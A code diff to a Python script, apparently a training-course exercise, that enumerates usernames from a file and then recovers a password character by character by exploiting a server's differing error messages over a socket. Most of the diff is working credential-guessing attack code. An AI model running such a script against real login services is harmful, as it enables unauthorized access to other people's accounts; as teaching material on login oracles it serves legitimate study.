@@ -1,12 +1,15 @@
 import socket
 import sys
 import itertools
-from string import ascii_lowercase, digits
+import json
+from string import ascii_lowercase, ascii_uppercase, digits
 
 max_length = 5
 max_tries = 10000000
 
 alphabet = ascii_lowercase + digits
+
+all_symbols = ascii_lowercase + ascii_uppercase + digits
 
 
 def brute_force():
@@ -96,21 +99,45 @@ if len(sys.argv) == 3:
         address = (IP, port)
         my_socket.connect(address)
         # create generator
-        with open("passwords.txt", 'r') as passwords:
-            for line in passwords:
-                for password in password_combinations(line):
-                    data = password.encode()
-                    my_socket.send(data)
-                    response = my_socket.recv(1024).decode()
-                    if response == "Connection success!":
-                        print(password)
-                        success = True
-                        break
-                if success:
+        login = ''
+        with open("logins.txt", 'r') as logins:
+            for line in logins:
+                session = dict()
+                session['login'] = line.rstrip('\n')
+                session['password'] = ""
+
+                data = json.dumps(session)
+                my_socket.send(data.encode())
+                result = my_socket.recv(1024)
+                answer = json.loads(result.decode())
+                if answer['result'] == "Exception happened during login":
+                    login = session['login']
                     break
 
+        if login != "":
+            success = False
+            password = ""
+            while not success:
+                for letter in all_symbols:
+                    session = dict()
+                    session['login'] = login
+                    session['password'] = password + letter
+
+                    data = json.dumps(session)
+                    my_socket.send(data.encode())
+                    result = my_socket.recv(1024)
+                    answer = json.loads(result.decode())
+                    if answer['result'] == "Exception happened during login":
+                        password = password + letter
+                        break
+                    elif answer['result'] == "Connection success!":
+                        success = True
+                        print(json.dumps(session))
+                        break
+
+
+
 else:
-    with open("passwords.txt", 'r') as passwords:
-        for line in passwords:
-            for password in password_combinations(line):
-                print(password)
+    with open("logins.txt", 'r') as logins:
+        for line in logins:
+            print()
